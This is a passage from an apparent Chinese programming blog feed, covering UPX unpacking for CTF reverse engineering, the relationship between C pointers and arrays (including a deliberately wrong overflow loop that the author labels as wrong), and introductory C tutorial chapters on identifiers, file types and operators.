more help                    -L    display software license</span><br><span class="line">Options:</span><br><span class="line">  -q     be quiet                          -v    be verbose</span><br><span class="line">  -oFILE write output to &#x27;FILE&#x27;</span><br><span class="line">  -f     force compression of suspicious files</span><br><span class="line">  -k     keep backup files</span><br><span class="line">file..   executables to (de)compress</span><br><span class="line"></span><br><span class="line">Type &#x27;upx --help&#x27; for more detailed help.</span><br><span class="line"></span><br><span class="line">UPX comes with ABSOLUTELY NO WARRANTY; for details visit https://upx.github.io</span><br></pre></td></tr></table></figure><h3 id="脱壳">脱壳</h3><h4 id="静态脱壳">静态脱壳:</h4><p>UPX本身提供脱壳器,使用参数-d即可脱壳.</p><p>但是UPX是基于加壳后可执行文件内存储的标识来查找并操作的,由于UPX开源,任何人可以修改这些标识,所以会导致官方的UPX脱壳失败,此时需要手动脱壳.</p><h4 id="动态脱壳">动态脱壳:</h4><p>可执行文件被操作系统载入后,寄存器中会放一些操作系统预先填充好的值,栈数据也会被设置,壳程序需要保留这些程序(状态),以免被壳段代码不经意间破坏.</p><p>一般,由于栈中原来的数据不应被更改,简单的壳程序一般将其压栈,x86的<code>pushad指令</code>就可以将所有的寄存器一次性压栈,UPX也是这样,称为<code>保护现场</code>.载入程序可以发现最开始为<code>pushad</code>,就可以执行该指令后再设置硬件断点,中断到一个长跳转后继续单步执行,找到原程序的入口(<code>OEP</code>,即原始入口点),然后Dump出来即还原.</p><p>或者如果没有发现pushad,则单步执行,单步执行为了防止跳过OEP,然后跳过UPX壳程序的循环代码,直到找到OEP,此时同样Dump即可.</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针和数组的关系</title>
      <link href="/2023-10-01-697284686813/"/>
      <url>/2023-10-01-697284686813/</url>
      
        <content type="html"><![CDATA[<h1 id="数组的本质">数组的本质</h1><p>在C/C++中,数组就是相同类型变量的有序集合,数组在一段连续的内存空间中存储他们—也就是数组的元素.</p><p>这段内存空间既可以在栈区,也可以在堆区,甚至可以在静态存储区.</p><p>不管在哪里分配,总之我们只需要知道这个数组的<code>首地址</code>和数组的<code>长度</code>,还有这个数组的<code>元素大小</code>,就可以确定这个数组.总之,我们就是为了能够统一存储一系列同类型的值.</p><h1 id="指针的本质">指针的本质</h1><p>指针的本质就是地址,而这个地址就是一个值,我们为了方便,一般将其以<code>16进制</code>进行显示.</p><p>C/C++中的指针的用途就是用来标识一个<code>数据对象</code>.一个数据对象有着他自己的长度(占用多少字节),指向这个数据对象的指针的类型就可以用于标识其长度.当然,还可以限定关于他的运算.</p><h1 id="指针和地址">指针和地址</h1><p>常常有人在争论:“指针不是地址,因为指针有类型”.</p><p>这句话可以说没有什么问题,但是他限定了讨论范围仅仅在C/C++语言中的指针.</p><p>如果在汇编中单独描述一个指针(例如栈基指针,栈顶指针),他们并没有任何的类型,毕竟汇编语言根本没有类型.汇编需要做的仅仅是根据寄存器中存有的地址值去定位内存而已.</p><p>但是在C/C++中情况就变得不同了.高级语言与低级语言最大的不同之一就是引入了<code>数据类型</code>,对于一块特定大小的内存,我们不再认为他们仅仅是几字节的二进制数据,取而代之的是,我们对这块内存设定一个类型,让我们能够以这种类型来进行对应的,针对性的操作,而不是再一视同仁.</p><p>类型的引入不仅仅帮助我们指定了运算,并且更重要的是,它规定了大小.例如x86的int占用4字节,double占用8字节.这让我们在处理数据的时候,不再需要像以前那样按照一个字节/一个字/2个字等等的去处理,而是直接根据需要的类型,去自动选择需要的宽度.</p><p>那么C/C++中的指针为了&quot;适应&quot;这种变化,自然不能够仅仅地去指定一个值去表示一个地址,相应地,<code>它必须有一个类型</code>,用于确认以这个地址为起始,究竟有多长的内存空间被视为一个数据对象进行处理.</p><p>换句话说,<code>C语言的指针是内存地址的一种高级抽象</code>.</p><p>所以,关于&quot;指针不是地址&quot;这个说法,要对半地去看,你怎么说都是可以的,因为各有各的道理,总之要结合起来去思考.</p><h1 id="指针和数组">指针和数组</h1><p>指针和数组存在着很复杂的关系,不仅仅包含下面讨论的这一点知识.</p><h2 id="数组指针">数组指针</h2><p>同理,既然C中指针能指向一般的内置类型,那么自定义的类型(例如数组)当然也应该可以指向,这就引入了数组指针,同理,声明一个指针数组也要写清楚具体的长度,这里实际上就是可以指向的数组的长度.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">10</span>]=&amp;arr; <span class="comment">//p是一个数组指针,被初始化为指向arr这个数组 </span></span><br></pre></td></tr></table></figure><h2 id="指针数组">指针数组</h2><p>指针数组实际上并没有什么单独拿出来的必要,因为指针变量(保存指针的变量)也是变量,只不过用来存储的值特殊了点而已.</p><p>那么,指针数组自然就是用来存储一系列的指针的数组了,没什么好说的.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* arr[<span class="number">10</span>]; <span class="comment">// arr为指针数组，数组中的元素都是指针</span></span><br></pre></td></tr></table></figure><h2 id="数组的首地址">数组的首地址</h2><p>实际上这个概念是比较模糊的,本人在这里给出一个逻辑:</p><p><code>数组的首地址</code>的类型是<code>指向这个数组的指针</code>,也就是说,对这个类型的地址加1,结果是加了这个数组的长度.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">10</span>] = &amp;a;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(p + <span class="number">1</span>) - (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu&quot;</span>, value);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序输出的结果是40,也就是sizeof(a)的值.</p><p>其中,p中保存的就是数组的首地址,如果把初始化的值<code>&amp;a</code>改为<code>a</code>,那么编译器会报一个警告(C语言中)甚至是报错(C++中).</p><p>而<code>数组首元素的地址</code>的类型就是<code>指向数组元素类型的指针</code>,我们看例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(p + <span class="number">1</span>) - (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu&quot;</span>, value);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序输出的结果是4,也就是sizeof(a[0])的值.</p><p>其中,p中保存的就是数组首元素的地址,如果把初始化的值<code>&amp;a[0]</code>改为<code>a</code>,那么编译器会报一个警告(C语言中)甚至是报错(C++中).</p><p>我们注意到,第一个程序中,如果把给p的初始值从<code>&amp;a</code>换成<code>a</code>,那么就会发生类型不匹配的问题.这里说的是C语言中数组标识符作为表达式时的一个特性:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001035338186.png" alt="image-20231001035338186"></p><p>实际上,在C/C++语言中,单独的数组名(也就是这个数组的标识符)作为<code>表达式</code>,其类型为<code>指向数组元素的指针</code>,而值和<code>数组的首地址</code>相等.所以,上图报错(C++中)称不能在初始化中将’int*'类型转换为’int (*)[10]'类型.</p><p>进一步,我们如果有<code>int a[10];</code>那么<code>a+1</code>实际上是一个指针运算,<code>a+1</code>的值显然,是a向后偏移了4个字节—也就是<code>sizeof(int)*1</code>,更准确的说,这里应该是<code>sizeof(*a) * 4</code>.</p><p>再例如我们有<code>int a[10];</code>和<code>int offset=3;</code>那么<code>a+offset</code>相对于a的值向后偏移了如下字节数:</p><p><code>sizeof(*a) * offset</code></p><h1 id="指针和数组是否等价">指针和数组是否等价</h1><h2 id="数组就是指针">数组就是指针?</h2><p>说实话,在写这篇短文的时候,我也比较纠结,但是经过了不短时间的学习,并且恰巧看了《C++20高级编程》中相关的描述,我还是认为&quot;数组就是指针&quot;这句话一定程度上是对的.</p><h3 id="一段有问题的代码">一段有问题的代码</h3><p>我们首先来看一段代码,这段代码实际上是有问题的,但是他没有报错!我们就是要说明这个问题:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> int_before_a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">a[i] = i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, int_before_a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序在Win11下使用gcc12.2编译成功为x64程序,运行结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001161610190.png" alt="image-20231001161610190" style="zoom:50%;" /><p>显然,程序中的第一个循环发生了溢出,实际上a只有0-9这个10个下标的元素,但是我们错误地对a[10]这个不存在的元素进行了赋值,然后会发现前面的int_before_a被覆盖了,也就是说,这里的所谓a[10]正是int_before_a.</p><p>有人可能会疑惑,明明int_before_a的声明位置在a的前面,为什么对a的访问&quot;向后&quot;溢出了,却能访问到前面的int_before_a?</p><p>实际上,在gcc实现中,函数内的各个局部变量默认从上向下依次压栈连续存储,我们又知道,栈从高地址向低地址开辟空间,也就是说,rbp(栈基寄存器)指向的函数栈帧的栈底在相对高地址处,而rsp(栈顶寄存器)指向的栈顶在低地址,每次rsp减小时,都意味着&quot;压入&quot;一个变量或寄存器的值等.</p><p>那么,首先从栈帧的高地址处先压入int_before_a这个局部变量,然后再继续压入a这个数组;而且,a的首元素是在靠近栈顶的一段;a的尾元素,也就是a[9],在靠近栈底的位置,就这个程序而言,a[9]的下面(指栈的底部)紧挨着就是int_before_a.</p><p>使用IDA反编译出来伪代码的结果如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001162737882.png" alt="image-20231001162737882" style="zoom:45%;" /></p><p>再来看一下main函数的栈帧结果如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001162948884.png" alt="image-20231001162948884" style="zoom:45%;" /></p><p>实际上,<code>a[i]</code>和<code>*(a+i)</code>完全等价,底层上,对数组进行下标运算确实是这样实现的,那么我们就可以理解,a[10]就被解释为<code>*(a+10)</code>,那么<code>a+10</code>作为一个指针值,当然比<code>a+9</code>要大,意味着它指向更高的地址,这里实际上就恰好指到了int_before_a这个变量的位置,然后我们对其进行赋值,就发生了溢出.</p><h3 id="数组就是指针">数组就是指针</h3><p>从语法层面,我们声明一个数组当然和声明一个指针<code>完全</code>不同,但是一旦编译器处理完毕,数组的各种行为就和指针一模一样,例如,下标运算被转换为对应等价的指针运算.</p><p><strong>事实上</strong>,无论是C还是C++,数组都没有包含任何的大小信息(数组的长度)!这也是我们在C++中更推荐使用<code>现代容器</code>的一个原因!</p><p>如果数组能够相对于指针多出长度的信息,那么显然上面的溢出就没有那么容易出现.但是很遗憾,数组的下标运算被完全转换为指针运算,那么这时候,C编译器没有义务为你去检查你的操作是否合理,你至多只会收到段错误的异常而已.</p><p>如果你使用一些智能的IDE,你可能会反驳:我的软件明明给我提出了警告啊?</p><p>要知道,这是软件提供的智能服务,并不是C编译器自己的行为,软件可以找到可能潜在的问题,但是没有权利对这些问题进行绝对的禁止!只有真正的编译器才有权利去决定你的代码最终是否合法.</p><p>总而言之,所谓的&quot;数组就是指针&quot;,指的是C语言数组的行为实际和对应的指针运算完全等价.</p><h2 id="指针就是数组">指针就是数组?</h2><p>很显然,这句话是错误的!</p><h3 id="什么时候指针等价于数组">什么时候指针等价于数组</h3><p>只有当某个指针变量指向了某一块可以使用的,被分配好的,用于作为数组存储一系列值的数据块时,这个指针才和数组是等价的.</p><p>因为和一般的数组名作为标识符一样,它也特定标识了一段内存空间,我们便可以用这个指针变量进行数组访问.我们甚至可以对这个指针变量使用<code>数组下标运算符</code>!</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p = a;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">a[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在后面的代码中直接将p视作一个数组的标识来进行使用.当然,你仍然可以这样使用它:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p = a;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">a[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *(p+i));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="什么时候指针不等价于数组">什么时候指针不等价于数组</h3><p>当指针仅仅指向了一个单一的变量(数据对象)时,它仅仅表现出一个普通的指针该有的行为,而我们若把它视作一个数组—那么显然很可能会出现像上面的溢出那样的问题.</p><p>当然,如果我们有下面的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n=<span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> *p=&amp;n;</span><br></pre></td></tr></table></figure><p>那么我们使用p来访问n,可以使用*p来完成,而且p[0]也是合法的,只是这种写法体现出来的风格十分可疑,并且没有带来任何的好处!</p><h1 id="如何正确使用指针">如何正确使用指针</h1><p>另外我认为,使用指针的一个非常重要的思维就是,一定要搞清楚当前这个指针的类型,指针的行为与其类型息息相关.</p><p>例如很多人可能有一种错觉,就是在学习二维数组和指针的关系时,认为<code>二级指针---例如int **</code>和<code>一维数组指针---例如int (*)[10]</code>是一样的,毕竟他们都是在一维指针的基础上更上了一层,但实际上,<code>二者的差别很大</code>,如果你在学习阶段做了足够多的尝试和试错,你应该会有更加深刻的体会.</p><p>​—WAHAHA 2023.10.1</p>]]></content>
      
      
      <categories>
          
          <category> 琐碎想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1_2-关键概念</title>
      <link href="/2023-09-30-4deceb66e98f/"/>
      <url>/2023-09-30-4deceb66e98f/</url>
      
        <content type="html"><![CDATA[<p>PS:本文章参考自C primer plus.</p><h1 id="编程机制">编程机制</h1><p>生成程序的具体过程根据语言和操作系统的不同.C语言是可移植性语言,可以在多种不同的环境下使用,包括UNIX,Linux,MS-DOS,Windows,Macintosh OS.本系列文章基本只关心不同环境所共有的部分,至于一些不同环境的不同处理,会特别指出.</p><p>事实上,就学习C语言而言,我们无需理会编程机制,但是了解一下这方面的知识,对于学习/理解C程序有着莫大的帮助.</p><p>用C编写程序时,我们手动直接编写的代码,大部分系统中都要求在.c为后缀名的文件中,它仍然是纯文本(和.txt的唯一区别就是后缀名).至于对文件名的要求,不同操作系统各不相同,例如MS-DOS过于老旧,它要求文件的基本名不能超过8个字符.</p><h2 id="目标代码文件-可执行文件和库">目标代码文件,可执行文件和库</h2><p>作为初学,我们仅仅需要关心源代码,并将其编译为可执行文件即可,但是事实上,C程序的生成没有那么简单.C程序在生成过程中会有许多中间文件的生成,这里简单讲解一下最基本的过程.</p><p>首先,C编译器要将源代码转换为机器语言代码,存放在<code>目标代码文件</code>,这个文件已经是二进制的了,但是并不能在操作系统上直接运行,因为它还缺少<code>启动代码</code>等信息.</p><p><code>目标代码文件</code>缺少<code>启动代码</code>,有了对应操作系统特定的启动代码,目标代码才能被正常地处理运行.</p><p>除此之外,<code>目标代码文件</code>还缺少库函数,几乎所有的C程序都需要使用到C标准库中的函数,例如printf()函数的使用等,这些函数是C语言标准库已经写好的,我们只需要将他们包含进去即可,这些信息都存放在相应的<code>库</code>文件中,<code>库</code>中包含有许多函数的<code>目标代码</code>.</p><p>接下来就需要进行<code>链接</code>操作,链接器的作用是,将你编写的目标代码和库代码,系统的标准启动代码整合到一起,最终生成的二进制文件才是我们能够运行的程序.</p><h1 id="c代码的基本要素">C代码的基本要素</h1><p>我们在上一篇文章已经讲解了一个完整的C程序的各个组成部分了,这里要进一步进行描述.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是一段注释---这是一个hello world程序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 这是一行注释</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">//包含一个头文件stdio.h,其中</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;<span class="comment">// 这是一个函数,而且是C程序的入口,一切必须从这里开始执行</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>); <span class="comment">// printf是一个函数,用于输出一个字符串,这里输出&quot;Hello World！&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 代表结束main函数,并返回一个0,这里先不用关心其作用,只要记住main函数要加上这条语句即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到,在C代码中,有着各式各样的字符,不仅有标点符号,还有数字,字母,他们的排列构成各个<code>标识符</code>,<code>指令</code>,<code>数据</code>等等.对于这些内容,有着一些最基本的规范.</p><h2 id="字符集">字符集</h2><p>C语言基于英文字符进行编写,正常来说,我们所有需要使用到的字符,都可以在我们日常使用到的键盘上找到(不使用任何输入法),也就是说,无论是我们拼写的变量名,还是各个指令,亦或是运算符,都需要使用英文字符去组成,而我们的中文字符,中文汉字,或者是其他国家的各种字符,从规范的角度,都不应该出现(字符串除外).</p><p>因此必须要注意的是,对于变量名等<code>标识符</code>,我们应该只使用英文字母(和其他C语言允许的英文字符)进行构成;</p><p>对于运算符等符号,我们只能使用英文的标点符号,而且不同于<code>标识符</code>,这里是硬性要求,绝对不能使用除英文字符以外的字符—除非你想在你的程序里翻来覆去半天看不出问题.</p><p>所以,在编写程序时,为了您和电脑的健康和安全,请务必关闭中文输入法!(除非你要输入一个中文的字符串)</p><h2 id="标识符的命名规范">标识符的命名规范</h2><p>我们来看一下标准中对<code>标识符</code>的定义:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001003151232.png" alt="image-20231001003151232" style="zoom:33%;" /><p>说人话就是,各种我们能自己命名的玩意都是标识符.doge~</p><p>其中就包括变量名,函数名等.</p><p>关于<code>标识符</code>的命名方式,有一些要求:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 标识符必须以字母a-z、 A-Z或下划线开头，后面可跟任意个(可为<span class="number">0</span>)字符，这些字符可以是字母、下划线和数字，其他字符不允许出现在标识符中</span><br><span class="line"><span class="number">2</span> 标识符严格区分大小写字母</span><br><span class="line"><span class="number">3</span> 标识符的长度，c89规定<span class="number">31</span>个字符以内，c99规定<span class="number">63</span>个字符以内(没有哪个疯子超出这个范围吧...)</span><br><span class="line"><span class="number">4</span> C语言中的关键字，有特殊意义，不能作为标识符(例如<span class="keyword">if</span>,<span class="keyword">for</span>,<span class="keyword">while</span>,<span class="keyword">goto</span>,<span class="keyword">return</span>等)</span><br><span class="line"><span class="number">5</span> 自定义标识符最好取具有一定意义的字符串，便于记忆和理解</span><br><span class="line"><span class="number">6</span> 不同平台最好遵循各自的命名规范,例如Windows一般使用驼峰命名法,Linux使用下划线命名法</span><br></pre></td></tr></table></figure><p>这里说的<code>关键字</code>,在下面说明.</p><h2 id="关键字和保留的标识符">关键字和保留的标识符</h2><h3 id="关键字">关键字</h3><p>关键字就是构成C语言的关键词,由它们构成C的语法体系,所以,这些词语是不能够被使用做标识符名称的.</p><p>具体见:<a href="https://zh.cppreference.com/w/c/keyword">https://zh.cppreference.com/w/c/keyword</a></p><p>主要的是这些:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001003820548.png" alt="image-20231001003820548" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001003835758.png" alt="image-20231001003835758" style="zoom:50%;" /><p>其他还有很多,大部分是新标准引入的,我们暂时也用不到,这里就不放图了.</p><h3 id="保留的标识符">保留的标识符</h3><p>我们直接看标准的描述,这里放一张最基本的要求,实际上我们先记住,自定义的标识符不能和关键字重名.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001004113590.png" alt="image-20231001004113590"></p><p>​—WAHAHA 2023.9.30</p><h1 id="c语言的相关文件类型">C语言的相关文件类型</h1><h2 id="源文件">源文件</h2><p>源文件即C的源代码文件,以后缀<code>.c</code>结尾,我们编写的一般代码,包括函数定义等,都放在源文件中:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231107024355840.png" alt="image-20231107024355840" style="zoom:50%;" /><h2 id="头文件">头文件</h2><p>我们在编写程序时,往往要使用到很多的外部库,用以支持更多的功能,例如C语言默认的标准库,或者是我们自己编写的库,再或者是第三方开发者写好的库.</p><p>这些库中包含有许多的已经写好的函数等内容,我们往往找不到他们的源文件,因为他们一般是编译好的动态库文件,没有源代码,这时候,我们需要使用头文件来引入库中的各种声明,例如<code>一些函数的声明,常量的声明,宏的定义</code>,他们往往都在头文件当中.我们只需要使用<code>#include</code>指令来在我们的源文件中引用该头文件,就可以使用对应的函数了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231107024955234.png" alt="image-20231107024955234" style="zoom:50%;" /><h2 id="其他中间文件">其他中间文件</h2><p>编译器在编译过程中会生成一些中间文件,例如.s汇编文件,.o目标文件等等,我们暂时无需理会.</p><p>另外,不同的软件有着各自管理C语言工程的方式,他们往往会在项目文件夹下生成各种各样的文件,他们并不是C标准使用的文件,而是软件特定生成的文件,用于管理项目.例如VS会生成<code>.sln文件</code>,VC++6.0会生成<code>.opt文件</code>等等.</p><p>目前,我们仅仅需要关心.c源文件和.h头文件这两种文件即可.</p><p>​—WAHAHA 2023.11.07</p><br><br><p>上一篇:<a href="../2023-09-19-d1f77d78f8b6/">c语言教程-1_1-什么是程序</a></p><p>下一篇:<a href="../2023-09-19-bb3b8099b657/">c语言教程-2-环境搭建</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-9-运算符及其优先级和求值顺序</title>
      <link href="/2023-09-30-a60ec9bcedd8/"/>
      <url>/2023-09-30-a60ec9bcedd8/</url>
      
        <content type="html"><![CDATA[<p>注意,本章讲解的<code>优先级</code>,<code>求值顺序</code>,<code>副作用</code>极其重要,甚至一些十分熟悉C语言的老手也可能会犯相关的错误!</p><h1 id="运算符">运算符</h1><h2 id="什么是运算符">什么是运算符</h2><p>我们在前面讲解过<code>表达式</code>,<code>语句</code>的概念,也讲解并使用了一些基本的<code>运算符</code>,例如四则运算,赋值运算符等.</p><p>这一部分我们将会详细扩充一些运算符,并仔细讲解运算符与表达式求值的一些重要细节.</p><p>运算符和表达式不可分割,我们再来看一下标准中对<code>表达式</code>的描述:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png" alt=""></p><p>再看一下Microsoft文档中关于操作数的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930224827531.png" alt="image-20230930224827531" style="zoom:40%;" /><p>也就是说,<code>运算符</code>及其<code>操作数</code>的序列组成一个表达式.单一的运算符无法发挥作用,必须至少有一个对应的操作数才能构成一个表达式.至于<code>操作数</code>的概念很好理解,简单来说就是参与运算的各种值.</p><p>下面来详细细分一下C语言中的各种运算符.</p><h2 id="基本运算符">基本运算符</h2><p>我们之前已经大量的使用了这些运算符.</p><h3 id="赋值运算符">赋值运算符: =</h3><p>C语言中,一个单独的<code>=</code>并不意味着&quot;等于&quot;,这和<code>Visual Baisc</code>等语言并不相同,他是一个赋值运算符.例如:</p><p><code>a = 3;</code></p><p>用于将=右边的值<code>3</code>赋给左边的变量<code>a</code>.也就是说,=左边是一个变量名,右侧是将要赋给该变量的值.</p><p>赋值行为是从右向左的.</p><p>进一步注意,我们需要区分变量名和变量值的区别,尽管他们的区别可能微乎其微,但是如果我们有:</p><p><code>i=i+1;</code></p><p>显然这个合法的语句在数学上行不通,但是,C语言中,这代表着把变量i的值加上1,然后将新值重新赋值给i变量.</p><p>另一方面,类似这样的语句是错误的:</p><p><code>3 = 